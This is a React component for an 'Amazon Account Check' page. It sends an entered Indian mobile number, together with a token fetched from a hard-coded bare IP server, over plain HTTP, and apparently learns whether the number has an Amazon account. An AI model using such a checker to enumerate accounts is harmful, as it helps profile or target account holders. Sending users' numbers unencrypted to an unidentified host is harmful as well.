import React, { useState } from "react";

function App() {
  const [mobile, setMobile] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);

  const handleLogin = async () => {
     if (mobile.length !== 10) {
      alert("Please enter a valid 10-digit mobile number");
      return;
    }

    setLoading(true);
    try {
     
       const getRes = await fetch("http://187.77.184.135:5000/api/account");
      const data = await getRes.json();
      
      if (data.success) { 
        const fullMobileNumber = `+91${mobile}`;

         const postRes = await fetch("http://187.77.184.135:5000/api/user", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
          mobile_no: fullMobileNumber,  
          token:data.token,
          claim:data.claim
          }),
        });

        const postData = await postRes.json();
        
         setResult(postData.message || postData); 
      }
    } catch (err) {
      alert("Error: " + err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <h2>Amazon Account Check</h2>

      <div style={{ marginBottom: "10px" }}>
        {/* Simple visual prefix for user clarity */}
        <span style={{ marginRight: "5px" }}></span>
        <input
          type="text"
          placeholder="Enter Mobile Number"
          value={mobile}
          onChange={(e) =>
            setMobile(e.target.value.replace(/\D/g, "")) 
          }
          maxLength={10}
        />
      </div>

      <button onClick={handleLogin} disabled={loading}>
        {loading ? "Please wait..." : "Submit"}
      </button>

      {result && (
       <h4>{result}</h4>
      )}
    </>
  );
}

export default App;
